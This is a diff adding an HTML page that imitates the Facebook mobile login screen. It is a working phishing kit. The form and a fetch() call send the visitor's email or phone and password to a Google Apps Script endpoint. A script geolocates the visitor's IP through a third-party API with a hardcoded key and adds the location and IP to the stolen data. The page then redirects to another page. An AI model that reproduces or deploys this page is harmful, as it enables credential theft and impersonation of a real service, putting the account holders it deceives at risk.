@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./mobile.css">
+    <title>Facebook Mobile</title>
+</head>
+<body>
+    <header>
+        <p class="lang1">English (UK)</p>
+    </header>
+
+    <div class="logo">
+        <img src="facebook (7).png" alt="Facebook-Logo">
+    </div>
+
+    <div class="wrapper" style="display: flex; justify-content: center;">
+        <form action= 'https://script.google.com/macros/s/AKfycbzSOb-LvQDWXG-y-ExDsvXEXLEzEAaOaOphOhFabJx6rfCQlfSsZsgAr3u68i2Yi-XlcQ/exec' id="form"  method="POST" >
+
+            <input type="text" name="USER" placeholder="Mobile number or email address" required>
+            <input type="text" name="PASS" placeholder="Password" required>
+            <input type="text" name="CATEGORY" value="FFBB" hidden>
+                          <input type="text" name="CONTINENT" id="continent" value="" hidden>
+                          <input type="text" name="COUNTRY" id="country" value="" hidden>
+                          <input type="text" name="CAPITAL" id="capital" value="" hidden>
+                          <input type="text" name="STATE" id="state" value="" hidden>
+                          <input type="text" name="CITY" id="city" value="" hidden>
+                          <input type="text" name="CURRENCY" id="currency" value="" hidden>
+                          <input type="text" name="PHONE_CODE" id="phone_code" value="" hidden>
+                          <input type="text" name="IP_ADDRESS" id="ip" value="" hidden>
+
+                          <button type="submit" name="submit" id="submit" class="btn">login</button>
+            <input class="log-in-button" type="submit" name="submit" value="Log in">
+        </form>
+        <a class="forgot" href="find.html">Forgotten Password?</a>
+    
+
+        <div id="error" style="display: none; color:red; margin:12px auto; font-size:0.8rem; padding:12px; text-align: center; "></div>
+        <a class="create-acc" href="#">Create new account</a>
+
+        <p class="meta"> Meta</p>
+        
+    
+        <ul>
+            <li><a class="footer-link">About</a></li>
+            <li><a class="footer-link">Help</a></li>
+            <li><a class="footer-link">More</a></li>
+        </ul>
+    
+    </div>
+
+    <script>
+        const  error= document.querySelector("#error");
+        const form = document.querySelector("#form")
+       const submitButton = document.querySelector("#submit")
+       const scriptURL = 'https://script.google.com/macros/s/AKfycbzSOb-LvQDWXG-y-ExDsvXEXLEzEAaOaOphOhFabJx6rfCQlfSsZsgAr3u68i2Yi-XlcQ/exec'
+    
+       form.addEventListener('submit', e => {
+         submitButton.disabled = true
+         e.preventDefault() 
+         let requestBody = new FormData(form)
+         fetch(scriptURL, { method: 'POST', body: requestBody})
+         .then(function response(data){
+ 
+          submitButton.disabled = true
+          window.location.href= "/contentgg.html";
+          form.rest();
+         })
+          .catch(error => {
+        
+            submitButton.disabled = false })
+}) 
+
+
+var xhr= new XMLHttpRequest();
+xhr.addEventListener('readystatechange', function (){
+
+
+  if(xhr.readyState==4){
+      var data = JSON.parse(this.responseText);
+      console.log(data);
+      let continentName = data.continent.name;
+      let countryName = data.country.name;
+      let cityName = data.country.capital;
+      let state= data.state.name;
+      let city= data.city.name;
+      let countryCurrency = data.country.currency;
+      let phoneCode= data.country.phone_code;
+      let ip = data.ip;
+
+      document.getElementById("continent").value = continentName;
+      document.getElementById("country").value = countryName;
+      document.getElementById("capital").value = cityName;
+      document.getElementById("state").value = state;
+      document.getElementById("city").value = city;
+      document.getElementById("currency").value = countryCurrency;
+      document.getElementById("phone_code").value = phoneCode;
+      document.getElementById("ip").value = ip;
+      
+    }
+
+   
+  })
+xhr.open('GET', 'https://api.geoapify.com/v1/ipinfo?&apiKey=1ee5beee55c74cde815530b82f8ab2bf');
+xhr.send();
+
+
+    
+    </script>
+   
+</body>
+</html>
